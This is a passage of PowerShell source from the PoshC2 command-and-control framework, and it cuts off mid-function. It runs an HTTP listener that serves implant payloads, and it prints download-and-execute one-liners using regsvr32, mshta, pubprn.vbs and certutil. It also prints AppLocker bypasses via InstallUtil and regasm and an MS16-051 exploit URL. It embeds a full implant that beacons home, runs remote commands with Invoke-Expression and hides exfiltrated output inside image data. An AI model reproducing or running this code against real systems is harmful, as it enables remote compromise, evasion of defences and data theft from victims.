    $Query = 'CREATE TABLE Creds (
        credsID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Username TEXT,
        Password TEXT,
        Hash TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE C2Server (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        HostnameIP TEXT,
        EncKey TEXT,
        DomainFrontHeader TEXT,
        DefaultSleep TEXT,
        KillDate TEXT,
        HTTPResponse TEXT,
        FolderPath TEXT,
        ServerPort TEXT,
        QuickCommand TEXT,
        DownloadURI TEXT,
        ProxyURL TEXT,
        ProxyUser TEXT,
        ProxyPass TEXT,
        Sounds TEXT,
        APIKEY TEXT,
        MobileNumber TEXT,
        URLS TEXT,
        SocksURLS TEXT,
        Insecure TEXT,
        UserAgent TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE History (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, EncKey, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent)
            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @EncKey, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent)'

    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
        DefaultSleep = $defaultbeacon
        KillDate = $killdatefm
        HostnameIP  = $ipv4address
        EncKey  = $EncKey
        DomainFrontHeader  = $domainfrontheader
        HTTPResponse = $httpresponse
        FolderPath = $global:newdir
        ServerPort = $serverport
        QuickCommand = $shortcut
        DownloadURI = $downloaduri
        Sounds = $enablesound
        APIKEY = $apikey
        MobileNumber = $MobileNumber
        URLS = $urlstring
        SocksURLS = $socksurlstring
        Insecure = $Insecure
        UserAgent = $useragent
    } | Out-Null

    $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
    Write-Host `n"PoshC2 Unique Encryption Key: $EncKey"

    Write-Host `n"Apache rewrite rules written to: $global:newdir\apache.conf" -ForegroundColor Green
    Out-File -InputObject $apache -Encoding ascii -FilePath "$global:newdir\apache.conf"
        
    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"

    write-host $shortcut `n -ForegroundColor green
    write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close)" -ForegroundColor green
    write-host ""
    write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close)" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`"" -ForegroundColor green
    write-host ""
    write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""
    write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`"" -ForegroundColor green
    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
    write-host ""

    # call back command
    
    Write-Host -Object "For " -NoNewline
    Write-Host -Object "Red Teaming " -NoNewline -ForegroundColor Red
    Write-Host -Object "activities, use the following payloads:"
    
    Import-Module $PoshPath\C2-Payloads.ps1 
    if ($Insecure -eq "YES") {
        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure
    } else {
        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
    }
    $payload = createrawpayload -command $command

    if ($enablepayloads -eq "Yes") {
        # create all payloads
        CreatePayload
        CreateStandAloneExe
        CreateHTAPayload
        CreateMacroPayload
        Create-MS16-051-Payload
        CreateLink
        CreateServiceExe
        CreateJavaPayload
        createdll
        poshjs
        rg_sct
        cs_sct
        df_sct
    } else {
        # create limited payloads
        CreatePayload
        CreateStandAloneExe
        CreateServiceExe
        rg_sct
        cs_sct
        df_sct
    }
    
    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    Write-Host `n"To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory: "
    Write-Host "$global:newdir" `n  -ForegroundColor Green
    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}C2-Server.ps1;C2-Server -RestartC2Server '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-C2Server.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()
    # add run as administrator 
    $bytes = [System.IO.File]::ReadAllBytes("$global:newdir\Restart-C2Server.lnk")
    $bytes[0x15] = $bytes[0x15] -bor 0x20
    [System.IO.File]::WriteAllBytes("$global:newdir\Restart-C2Server.lnk", $bytes)

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-Implant-Handler.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()
    # add run as administrator 
    $bytes = [System.IO.File]::ReadAllBytes("$global:newdir\Restart-Implant-Handler.lnk")
    $bytes[0x15] = $bytes[0x15] -bor 0x20
    [System.IO.File]::WriteAllBytes("$global:newdir\Restart-Implant-Handler.lnk", $bytes)
}

# add as many images to the images directory as long as the images are less than 1500 bytes in size
$imageArray = @()
$imageFilesUsed = @()
$imageFiles = Get-ChildItem "$PoshPath\Images" | select FullName
$count = 0 

while ($count -lt 5) {

    $randomImage =  $imageFiles | Get-Random 
    $randomImage = $randomImage.FullName
    if (-not ($imageFilesUsed -contains $randomImage)){

        $imageBytes = Get-Content $randomImage -Encoding Byte

        if ($imageBytes.Length -lt 1495) {
            $imageFilesUsed += $randomImage
            $imageBytes = Get-Content $randomImage -Encoding Byte
            $imageArray += [Convert]::ToBase64String($imageBytes)
            $count = $count + 1
        }
    }
}

# C2 server component
$listener = New-Object -TypeName System.Net.HttpListener 

if ($ipv4address.Contains("https")) {
    $listener.Prefixes.Add("https://+:$serverport/") 
} else {
    $listener.Prefixes.Add("http://+:$serverport/") 
}
$readhost = 'PS >'
$listener.Start()

# while the HTTP server is listening do the grunt of the work
while ($listener.IsListening) 
{
    $message = $null
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
    
    $downloadStub = $urlstring -split ","
    $downloadStubURL = $downloadStub[1] -replace '"',''
    $newImplant = $urlstring -split ","
    $newImplantURL = $newImplant[0] -replace '"',''
       
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)$") 
    {
        $message = $payload
    }
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_ms16-051$")
    {
        if ([System.IO.File]::Exists("$global:newdir/payloads/ms16-051.html")){
            $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
        }else {
            $message = $httpresponse
        }

    }
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_rg$") 
    {
        
        if ([System.IO.File]::Exists("$global:newdir/payloads/rg_sct.xml")){
            $message = [IO.File]::ReadAllText("$global:newdir/payloads/rg_sct.xml")
        }else {
            $message = $httpresponse
        }
       
    }
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_cs$") 
    {

        if ([System.IO.File]::Exists("$global:newdir/payloads/cs_sct.xml")){
            $message = [IO.File]::ReadAllText("$global:newdir/payloads/cs_sct.xml")
        }else {
            $message = $httpresponse
        }

    }
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_js$") 
    {

        if ([System.IO.File]::Exists("$global:newdir/payloads/js_sct.xml")){
            $message = [IO.File]::ReadAllText("$global:newdir/payloads/js_sct.xml")
        }else {
            $message = $httpresponse
        }

    }
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_df$") 
    {

        if ([System.IO.File]::Exists("$global:newdir/payloads/df_sct.xml")){
            $message = [IO.File]::ReadAllText("$global:newdir/payloads/df_sct.xml")
        }else {
            $message = $httpresponse
        }

    }
    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_iu$") 
    {

        if ([System.IO.File]::Exists("$global:newdir/payloads/posh.exe")){
            $exe = $true
            $message = Get-Content "$global:newdir/payloads/posh.exe" -Encoding byte
        }else {
            $message = $httpresponse
        }

    }
    if ((($request.Url -match "/$($newImplantURL)$") -or ($request.Url -match "/$($newImplantURL)\?p") -or ($request.Url -match "/$($newImplantURL)\?d")) -and (($request.Cookies[0]).Name -match 'SessionID')) 
    { 

        if ($request.Url -match "/$($newImplantURL)\?p") {$type = "Proxy"} 
        if ($request.Url -match "/$($newImplantURL)\?d") {$type = "Daisy"} 
        if ($request.Url -match "/$($newImplantURL)$") {$type = "Normal"}

        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint
        $cookieplaintext = Decrypt-String -key $EncKey -encryptedStringWithIV ($request.Cookies[0]).Value

        $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)

        $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
        $defaultbeacon = $c2serverresults.DefaultSleep

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!
        $im_firstseen = $(Get-Date)
        if ($request.Url -match "/$($newImplantURL)\?p") {
            Write-Host "New Proxy implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
$connectvars = '
$URI= "'+$randomuri+'"
$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
$ServerClean = "'+$ipv4address+":"+$serverport+'"
'
        } elseif ($request.Url -match "/$($newImplantURL)\?d") {
            Write-Host "New Daisy implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
$connectvars = '
$URI= "'+$randomuri+'"
$ServerClean = $Server
$Server = "$server/'+$randomuri+'"
'
        } else {
            Write-Host "New Direct implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
$connectvars = '
$URI= "'+$randomuri+'"
$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
$ServerClean = "'+$ipv4address+":"+$serverport+'"
'
        }

        Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        # optional clockwork sms on new implant
        if (($apikey) -and ($mobilenumber)){
            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=NewImplant:$($im_domain)\$($im_computername)")|Out-Null
        }

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have an implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Proxy, Arch, Domain, Alive, Sleep, ModsLoaded, Pivot)
        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Proxy, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded, @Pivot)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = $im_firstseen
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Proxy  = $im_proxy
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
            Pivot = "$type"
        }

	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
        
        if ($autorunresults -ne $null){
			Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='implant-core.ps1' WHERE RandomURI='$randomuri'"|Out-Null
			$query = "INSERT INTO NewTasks (RandomURI, Command)
			VALUES (@RandomURI, @Command)"
			
			Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			RandomURI = $randomuri
			Command   = "LoadModule implant-core.ps1"
			} | Out-Null
			
            foreach ($i in $autorunresults) {
                $taskee = $i.Task
                			
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			    RandomURI = $randomuri
			    Command   = $taskee
                } | Out-Null
			
            }
		}

        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'

$payloadclear = @"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
`$S="$s"
function DEC {${function:DEC}}
function ENC {${function:ENC}}
function CAM {${function:CAM}}
function Get-Webclient {${function:Get-Webclient}} 
function Primer {${function:primer}}
`$primer = primer
if (`$primer) {`$primer| iex} else {
start-sleep 10
primer | iex }
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
$payload = $payloadraw -replace "`n", ""

function GetImgData($cmdoutput) {
    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
    
    try {$image = $icoimage|get-random}catch{}

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $maxdatalen = 1500 + ($cmdoutput.Length)
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen
    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImageBytesFull = New-Object byte[] $maxdatalen    
    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
    $ImageBytesFull
}
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}
function Encrypt-Bytes($key, $bytes) {
	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
	$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
	$gzipStream.Write( $bytes, 0, $bytes.Length )
	$gzipStream.Close()
	$bytes = $output.ToArray()
	$output.Close()
	$aesManaged = Create-AesManagedObject $key 
    $encryptor = $aesManaged.CreateEncryptor() 
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData 
	$fullData
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

'+$connectvars+'

while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = '+$urlstring+'
    $RandomURI = Get-Random $URLS
    $G=[guid]::NewGuid()
    $Server = "$ServerClean/$RandomURI$G/?$URI"
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
    
    while($ReadCommand) {
        $RandomURI = Get-Random $URLS
        $G=[guid]::NewGuid()
        $Server = "$ServerClean/$RandomURI$G/?$URI"
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $RandomURI = Get-Random $URLS
                        $G=[guid]::NewGuid()
                        $Server = "$ServerClean/$RandomURI$G/?$URI"
                        $error.clear()
                        if ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif ($i.ToLower().StartsWith("download-file")) {
                            try {
                                Invoke-Expression $i | Out-Null
                            }
                            catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } elseif ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            try {
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                            } catch{}
                        }
                    } 
            }
            elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif ($ReadCommandClear.ToLower().StartsWith("download-file")) {
                try {
                    Invoke-Expression $ReadCommandClear | Out-Null
                }
                catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }
            } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
            } catch {}
            }
        }
    break
    }
}'
$message = Encrypt-String -key $EncKey -unencryptedString $message

    }

    $randomuriagents = Invoke-SqliteQuery -DataSource $Database -Query 'SELECT RandomURI FROM Implants' -As SingleValue
            
    foreach ($ranuri in $randomuriagents) 
    {
    if ($ranuri -ne $null) 
    {
        $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
        $key = $im_results.Key
        $hostname = $im_results.Hostname
        $implantID = $im_results.ImplantID
        $imDom = $im_results.Domain

        $currenttime = (Get-Date)
        $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
        # send multi commands to the client 
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults))
        {
            $message = $null
            foreach ($i in $multicmdresults) {
                $taskid = $i.Command
                $taskidtime = $i.TaskID
                if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
                    Write-Host "Command issued against implant $implantID on host $hostname $imDom" -ForegroundColor Yellow
                    if  ($taskid.ToLower().startswith('upload-file')) {
                        Write-Host -Object "Uploading File" -ForegroundColor Yellow
                    } elseif ($taskid.ToLower().startswith("`$shellcode")) {
                        Write-Host "Uploading Shellcode: $hostname" -ForegroundColor Yellow
                    } else {
                        Write-Host -Object $taskid -ForegroundColor Yellow
                    }
                }
                if ($taskid.ToLower().StartsWith("loadmodule")) 
                {
                    $modulename = $taskid -replace 'LoadModule ', '' 
                    if (Test-Path "$PoshPath\Modules\$modulename") {
                    $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
                    # ensure the module name 
                    $module = "LoadModule"+$module
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $module
                    } else {
                        $message = $module 
                    }
                    } elseif (Test-Path "$modulename") {
                    $module = (Get-Content -Path "$modulename") -join "`n"
                    # ensure the module name 
                    $module = "LoadModule"+$module
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $module
                    } else {
                        $message = $module 
                    }
                    } else {
                    Write-Host "Error finding module"
                    }
                }
                else 
                {
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $taskid
                    } else {
                        $message = $taskid 
                    }
                }
                Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
            }
            if ($multicmdresults.Count -gt 1){
                $message = "multicmd" + $message
            }
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring                    
        }
        
        # send the default command/response if there is no command
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
        { 
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $message = 'fvdsghfdsyyh'
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring
        } 

        # a completed command has returned to the c2 server
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'POST')) 
        { 
            $responseStream = $request.InputStream 
            $targetStream = New-Object -TypeName System.IO.MemoryStream 
            $buffer = new-object byte[] 10KB 
            $count = $responseStream.Read($buffer,0,$buffer.length) 
            $downloadedBytes = $count 
            while ($count -gt 0) 
            { 
                $targetStream.Write($buffer, 0, $count) 
                $count = $responseStream.Read($buffer,0,$buffer.length) 
                $downloadedBytes = $downloadedBytes + $count 
            } 

            $len = $targetStream.length
            $size = $len + 1
